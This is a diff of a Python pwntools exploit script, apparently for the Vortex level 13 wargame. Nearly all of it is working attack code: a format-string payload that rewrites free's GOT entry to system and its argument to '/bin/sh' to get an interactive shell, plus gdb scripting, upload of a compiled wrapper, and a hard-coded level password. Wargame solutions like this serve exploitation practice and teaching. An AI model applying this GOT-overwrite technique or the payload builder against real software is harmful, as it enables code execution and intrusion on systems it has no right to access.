@@ -16,6 +16,7 @@ elf = None
 BINARY_PATH = None
 CWD = None
 LOCAL = None
+EXECUTE = False
 
 def pad(s, slen):
     return s + b"X" * (slen - len(s))
@@ -143,67 +144,93 @@ show env
 
 # break at main
 b *main
+shell sleep 0.5
 # run wrapper with symlink as arg, pipe input later into forked vortex process
 r `cat /tmp/docgil-raw` < /tmp/docgil
-
+shell sleep 0.5
 b *execve
+shell sleep 0.5
 c
+shell sleep 0.5
 si
+shell sleep 0.5
 si
+shell sleep 0.5
 del
+shell sleep 0.5
 break *main
-
+shell sleep 0.5
 c
+shell sleep 0.5
 # now in main from vortex prog
-
-# # calling fgets
-# b *0x080485bf
-
-# at vuln malloc
-b *0x080485a0
-
 b *exit
 b *printf
-b *malloc
 b *fgets
 
-# c
-# finish
-# echo "got of free:"
-# x/1wx 0x0804a010
 
 
 
-# # at vuln
-# b *0x08048593
+shell echo "show ebp"
+b *0x0804859d
+c
+i r ebp
+
+
+
+
+# c
+# shell sleep 0.5
+# c
+# shell sleep 0.5
+# c
+# shell echo "frees got updated"
+# shell sleep 0.5
+# 
 # 
 # 
 # c
+# shell sleep 0.5
 # c
+# shell sleep 0.5
 # c
-# si
-# finish
-# 
+# shell echo "now at printf for big payload"
 # shell echo "buf:"
-# x/s 0x804c5e0
+# x/s 0x804c600
+# 
+# shell sleep 0.5
+# finish
+# 
+# shell echo "updated free.got"
+# x/1wx 0x0804a010
+# 
+# shell echo "arg of system aka free.got"
+# x/1wx 0xffffde0c
+# 
+# si
+# shell sleep 0.5
+# si
+# shell sleep 0.5
+# si
 
 
-
-# # char checking 
-# break *0x080485f7
-# commands
-# shell echo "checking char at index"
-# i r edx
-# shell echo "press c to continue"
-# end
-# c
-# brings us to char checking breakpoint
 '''
 
-s = connect_to_local("13", "jMyg12=nB", remote=False)
-# s = connect("13", "jMyg12=nB")
+def send_fs_payload(io, fs):
+    io.send(fs)
+    r = io.recv(numb=1000000000, timeout=1000000)
+    log.info("done receiving")
+    return io
+
+
+# s = connect_to_local("13", "jMyg12=nB", remote=False)
+s = connect("13", "jMyg12=nB")
+
+# gdb -x /tmp/gdb /tmp/wrapper /vortex/vortex13
+
 cmd = "gdb -x /tmp/gdb /vortex/vortex13"
 wrapper_path = local_dir + "/vortex/wrapper"
+wrapper_src_path = local_dir + "/vortex/wrapper.cpp"
+remote_wrapper_path = "/tmp/wrapper"
 remote_payload_path = "/tmp/docgil-raw"
 remote_format_payload_path = "/tmp/docgil"
 if LOCAL:
@@ -216,14 +243,23 @@ vuln_adr = 0x0804859a
 free_got = 0x0804a010
 printf_got = 0x804a00c
 system_adr = 0xf7e0b040
+bin_sh_p = 0xf7f52338
 fs_payload_size = 0x13
-malloc_arg_p = 0xffffde18
+
+ebp = 0xffffde18
+# ebp-0x10
+malloc_arg_p = ebp-0x10
+# ebp-c
+local_var_buf_p = ebp-0xc
 
 # heap_fs_buf_adr = 0x804b1a0
 #  "%1002x%x%1232xZZ"
 
 # malloc ret adrs:
 # 0x804b1a0
+
+
+
 
 log.info(
     "############################################################################################################################################################")
@@ -234,7 +270,9 @@ upload(s, gdb_script, remote_gdb_script_path)
 
 symlink = None
 
-process(["rm", "/tmp/docgil"])
+if LOCAL:
+    process(["rm", "/tmp/docgil"])
+
 
 def to_ascii_bytes(number):
     return bytes(str(number), "utf-8")
@@ -247,9 +285,15 @@ def cleanup():
 def init_and_upload_payload(payload):
     global symlink
     symlink = payload
-    s.set_working_directory(bytes(CWD, "utf-8"))
-    s.ln(['-s', BINARY_PATH, symlink])
+    if LOCAL:
+        s.set_working_directory(bytes(CWD, "utf-8"))
+        s.ln(['-s', BINARY_PATH, symlink])
+    else:
+        s.process(['ln', '-s', BINARY_PATH, symlink], cwd=CWD)
     upload(s, payload, remote_payload_path)
+    hexdump = s.process(["hexdump", "-C", remote_payload_path]).recvall()
+    upload(s, hexdump, "/tmp/link-hexdump")
+    log.info(f"hexdump: {hexdump}")
 
 
 log.info(
@@ -266,10 +310,17 @@ def create_payload():
     payload += b"B"
     payload += pack(free_got, 32)
     payload += pack(malloc_arg_p, 32)
-    payload += pack(printf_got, 32)
-    payload += pack(printf_got+2, 32)
-    payload += pack(printf_got+2, 32)
-    payload += pack(printf_got+2, 32)
+    payload += pack(free_got, 32)
+    payload += pack(free_got+2, 32)
+    payload += pack(free_got+2, 32)
+
+    payload += pack(local_var_buf_p, 32)
+    payload += pack(local_var_buf_p, 32)
+    payload += pack(local_var_buf_p, 32)
+
+    payload += pack(local_var_buf_p+2, 32)
+    # payload += pack(local_var_buf_p+2, 32)
+
     payload += b"DDD"
     return payload
 
@@ -277,9 +328,16 @@ def create_payload():
 payload = create_payload()
 init_and_upload_payload(payload)
 
+process(["gcc", "-no-pie", "-m32", wrapper_src_path, "-o", wrapper_path]).recvall()
+s.upload(wrapper_path, remote_wrapper_path)
+s.process(["chmod", "a+x", remote_wrapper_path])
+
 
 def execute():
-    return s.process(["env", "-i", "setarch", "-R", wrapper_path, symlink])
+    if LOCAL:
+        return s.process(["env", "-i", "setarch", "-R", remote_wrapper_path, symlink])
+    else:
+        return s.process(["env", "-i", remote_wrapper_path, symlink])
 
 
 def execute_format_payload_peek(i):
@@ -331,9 +389,9 @@ def create_fs_paylad(padding, target, h=False, limit_pad=True):
         return format_payload
 
 
-off_until_payload = find_off_until_payload(b"0x804a010")
+# off_until_payload = find_off_until_payload(b"0x804a010")
 # always stays the same (aslr disabled)
-# off_until_payload = 117
+off_until_payload = 120
 # exit(1)
 log.info(
     "############################################################################################################################################################")
@@ -359,11 +417,9 @@ log.info(f"format_payload len: {len(format_payload)}")
 append_to_remote_file(s, format_payload, remote_format_payload_path)
 
 # 0xf7de37cb gets
-
-io = execute()
-io.send(format_payload)
-r = io.recv()
-log.info("done receiving")
+if EXECUTE:
+    io = execute()
+    send_fs_payload(io, format_payload)
 
 log.info("############################################################################################################################################################")
 log.info("# overwrite malloc size var")
@@ -376,51 +432,69 @@ log.info(f"format_payload len: {len(format_payload)}")
 
 
 append_to_remote_file(s, format_payload, remote_format_payload_path)
-
-io = execute()
-io.send(format_payload)
-r = io.recv()
-log.info("done receiving")
-
+if EXECUTE:
+    send_fs_payload(io, format_payload)
 
 log.info("############################################################################################################################################################")
-log.info("# update printf got to system")
+log.info("# update frees got to system and frees arg to binshP")
 log.info("############################################################################################################################################################")
-'''
-%134514067x%118$nXX
-%4158697536x%119$nX
-'''
 
+# SYSTEM ############################################################
 # 0xf7e0 b040
-format_payload = create_fs_paylad(0xb040, off_until_payload+4, h=True, limit_pad=False)
-format_payload += create_fs_paylad(0xf7e0-0xb040, off_until_payload+6, h=True, limit_pad=False)
+# b040
+already_padded = 0
+new_padding = already_padded + 0xb040
+format_payload = create_fs_paylad(new_padding, off_until_payload+4, h=True, limit_pad=False)
+
+# 0xf7e0
+already_padded = new_padding  # b040
+new_padding = 0xf7e0 - already_padded
+format_payload += create_fs_paylad(new_padding, off_until_payload+6, h=True, limit_pad=False)
+
+
+# 0xffffde1c -> BINSH ##############################################################
+# binsh : 0xf7f5 2338
+# 2338
+already_padded = 0xb040+(0xf7e0-0xb040)     # 0xf7e0
+new_padding = 0x12338-already_padded    # 0x2b58
+format_payload += create_fs_paylad(new_padding, off_until_payload+8, h=False, limit_pad=False)
+#
+# # 0xf7f5
+already_padded = 0xf7e0 + 0x2b58     # 0x12238
+new_padding = 0x1f7f5-already_padded    # 0xd5bd
+format_payload += create_fs_paylad(new_padding, off_until_payload+10, h=False, limit_pad=False)
+
 format_payload = pad(format_payload, new_malloc_size-1)
+
 
 log.info(f"format_payload: {format_payload}")
 log.info(f"format_payload len: {len(format_payload)}")
-
-
 append_to_remote_file(s, format_payload, remote_format_payload_path)
 
-io = execute()
-io.send(format_payload)
-r = io.recv()
-log.info("done receiving")
+log.info("malloc_arg_p: " + hex(malloc_arg_p))
+log.info("local_var_buf_p: " + hex(local_var_buf_p))
+
+if EXECUTE:
+    io = send_fs_payload(io, format_payload)
+    io.interactive()
+else:
+    goto_bash(s)
+
+# r = io.recv()
+# log.info("done receiving")
 
 
 
-
-
-log.info("############################################################################################################################################################")
-log.info("# send /bin/sh to execute shell")
-log.info("############################################################################################################################################################")
-
-
-format_payload = pad(b"sh\n", new_malloc_size-1)
-append_to_remote_file(s, format_payload, remote_format_payload_path)
-
-
-io.send(format_payload)
-io.interactive()
+# log.info("############################################################################################################################################################")
+# log.info("# send sh\\n to execute shell")
+# log.info("############################################################################################################################################################")
+#
+#
+# format_payload = pad(b"sh\n", new_malloc_size-1)
+# append_to_remote_file(s, format_payload, remote_format_payload_path)
+#
+#
+# io.send(format_payload)
+# io.interactive()
 
 # printf makes free point to system and ebp-c point to /bin/sh pointer
